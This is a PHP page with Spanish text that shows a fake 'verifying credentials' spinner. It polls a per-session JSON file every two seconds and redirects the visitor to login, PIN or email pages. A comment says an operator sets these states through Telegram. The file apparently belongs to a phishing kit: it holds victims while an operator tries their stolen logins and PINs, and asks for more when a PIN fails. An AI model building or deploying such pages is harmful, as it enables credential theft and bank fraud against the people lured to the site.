<?php
session_start();
$id_sesion = isset($_SESSION['usuario_id']) ? $_SESSION['usuario_id'] : '';
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Procesando Solicitud</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { text-align: center; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 360px; }
        .spinner { border: 4px solid rgba(0, 0, 0, 0.1); width: 50px; height: 50px; border-radius: 50%; border-left-color: #0076ff; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h3 { color: #333; margin-bottom: 8px; }
        p { color: #666; font-size: 14px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="spinner"></div>
        <h3>Verificando credenciales...</h3>
        <p>Por favor, espere un momento mientras validamos su acceso de seguridad.</p>
    </div>

    <script>
        const usuarioId = "<?php echo $id_sesion; ?>";

        function consultarServidor() {
            if (!usuarioId) return;

            // Consultar el archivo JSON en la raíz de sesiones sin caché
            fetch('./sesiones/' + usuarioId + '.json?v=' + new Date().getTime())
                .then(res => res.json())
                .then(data => {
                    // Control de redirecciones independientes basadas en la orden de Telegram
                    if (data.estado === 'index_error') {
                        window.location.href = 'index.php?error=auth';
                    } else if (data.estado === 'pin_normal') {
                        window.location.href = 'pin.php';
                    } else if (data.estado === 'correo_ok') {
                        window.location.href = 'correo.php';
                    } else if (data.estado === 'pin_rebotado') {
                        window.location.href = 'pin.php?error=pin_malo';
                    }
                })
                .catch(err => console.log("Esperando instrucción del instructor..."));
        }

        if (usuarioId) {
            setInterval(consultarServidor, 2000); // Monitoreo en vivo cada 2 segundos
        }
    </script>
</body>
</html>
